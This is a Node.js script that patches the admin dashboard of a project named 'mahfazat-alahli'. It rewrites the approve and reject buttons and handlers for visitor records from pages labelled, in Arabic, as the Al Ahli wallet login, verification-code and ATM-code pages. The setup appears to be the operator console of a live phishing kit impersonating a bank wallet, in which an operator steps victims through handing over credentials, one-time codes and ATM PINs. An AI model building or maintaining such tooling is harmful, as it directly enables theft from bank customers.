// Fix NBE buttons - use onclick with skipDetailsUpdate like other buttons
const fs = require('fs');
const path = '/home/ubuntu/mahfazat-alahli/server/admin/index.html';
let content = fs.readFileSync(path, 'utf8');

// Remove the old NBE buttons block and replace with onclick-based buttons
const oldBlock = `            // إضافة أزرار موافقة/رفض لصفحات محفظة الأهلي
            if (dataEntry.page === 'تسجيل الدخول - محفظة الأهلي' || dataEntry.page === 'رمز التحقق - محفظة الأهلي' || dataEntry.page === 'رمز ATM - محفظة الأهلي') {
              const nbeApproveBtnId = 'nbe-approve-btn-' + visitor.socketId + '-' + dataIndex;
              const nbeRejectBtnId = 'nbe-reject-btn-' + visitor.socketId + '-' + dataIndex;
              html += '<div class="flex gap-2 mt-3">';
              html += '<button id="' + nbeApproveBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
              html += '<button id="' + nbeRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
              html += '</div>';
              setTimeout(() => {
                const approveBtn = document.getElementById(nbeApproveBtnId);
                const rejectBtn = document.getElementById(nbeRejectBtnId);
                if (approveBtn) {
                  approveBtn.addEventListener('click', () => {
                    approveForm(visitor.socketId);
                    const originalText = approveBtn.textContent;
                    const originalClasses = ['bg-green-600', 'hover:bg-green-700'];
                    approveBtn.textContent = 'تم الإرسال ✓';
                    approveBtn.classList.remove(...originalClasses);
                    approveBtn.classList.add('bg-gray-400');
                    setTimeout(() => {
                      approveBtn.textContent = originalText;
                      approveBtn.classList.remove('bg-gray-400');
                      approveBtn.classList.add(...originalClasses);
                    }, 1500);
                  });
                }
                if (rejectBtn) {
                  rejectBtn.addEventListener('click', () => {
                    rejectForm(visitor.socketId);
                    const originalText = rejectBtn.textContent;
                    const originalClasses = ['bg-red-600', 'hover:bg-red-700'];
                    rejectBtn.textContent = 'تم الإرسال ✓';
                    rejectBtn.classList.remove(...originalClasses);
                    rejectBtn.classList.add('bg-gray-400');
                    setTimeout(() => {
                      rejectBtn.textContent = originalText;
                      rejectBtn.classList.remove('bg-gray-400');
                      rejectBtn.classList.add(...originalClasses);
                    }, 1500);
                  });
                }
              }, 100);
            }`;

const newBlock = `            // إضافة أزرار موافقة/رفض لصفحات محفظة الأهلي
            if (dataEntry.page === 'تسجيل الدخول - محفظة الأهلي' || dataEntry.page === 'رمز التحقق - محفظة الأهلي' || dataEntry.page === 'رمز ATM - محفظة الأهلي') {
              html += '<div class="flex gap-2 mt-3">';
              html += '<button onclick="nbeApproveAction(this, \\'' + visitor.socketId + '\\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
              html += '<button onclick="nbeRejectAction(this, \\'' + visitor.socketId + '\\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
              html += '</div>';
            }`;

if (content.includes(oldBlock)) {
  content = content.replace(oldBlock, newBlock);
  console.log('SUCCESS: Replaced NBE buttons block');
} else {
  console.log('ERROR: Old block not found');
  process.exit(1);
}

// Now add the nbeApproveAction and nbeRejectAction functions after rejectForm function
const afterRejectForm = `    function rejectForm(socketId) {
      socket.emit('admin:reject', { visitorSocketId: socketId });
      // تحديث حالة الانتظار للزائر
      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
      if (visitor) {
        visitor.waitingForAdminResponse = false;
        renderVisitors();
        if (selectedVisitorId === visitor._id) renderVisitorDetails(visitor);
      }
    }`;

const newFunctions = `    function rejectForm(socketId) {
      socket.emit('admin:reject', { visitorSocketId: socketId });
      // تحديث حالة الانتظار للزائر
      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
      if (visitor) {
        visitor.waitingForAdminResponse = false;
        renderVisitors();
        if (selectedVisitorId === visitor._id) renderVisitorDetails(visitor);
      }
    }

    function nbeApproveAction(btn, socketId) {
      const originalText = btn.textContent;
      window.skipDetailsUpdate = true;
      socket.emit('admin:approve', { visitorSocketId: socketId });
      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
      if (visitor) {
        visitor.waitingForAdminResponse = false;
        renderVisitorsList();
      }
      btn.textContent = 'تم الإرسال ✓';
      btn.classList.remove('bg-green-600', 'hover:bg-green-700');
      btn.classList.add('bg-gray-400');
      setTimeout(() => {
        window.skipDetailsUpdate = false;
        btn.textContent = originalText;
        btn.classList.remove('bg-gray-400');
        btn.classList.add('bg-green-600', 'hover:bg-green-700');
      }, 1500);
    }

    function nbeRejectAction(btn, socketId) {
      const originalText = btn.textContent;
      window.skipDetailsUpdate = true;
      socket.emit('admin:reject', { visitorSocketId: socketId });
      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
      if (visitor) {
        visitor.waitingForAdminResponse = false;
        renderVisitorsList();
      }
      btn.textContent = 'تم الإرسال ✓';
      btn.classList.remove('bg-red-600', 'hover:bg-red-700');
      btn.classList.add('bg-gray-400');
      setTimeout(() => {
        window.skipDetailsUpdate = false;
        btn.textContent = originalText;
        btn.classList.remove('bg-gray-400');
        btn.classList.add('bg-red-600', 'hover:bg-red-700');
      }, 1500);
    }`;

if (content.includes(afterRejectForm)) {
  content = content.replace(afterRejectForm, newFunctions);
  console.log('SUCCESS: Added nbeApproveAction and nbeRejectAction functions');
} else {
  console.log('ERROR: rejectForm function not found');
  process.exit(1);
}

fs.writeFileSync(path, content, 'utf8');
console.log('DONE: All changes applied');
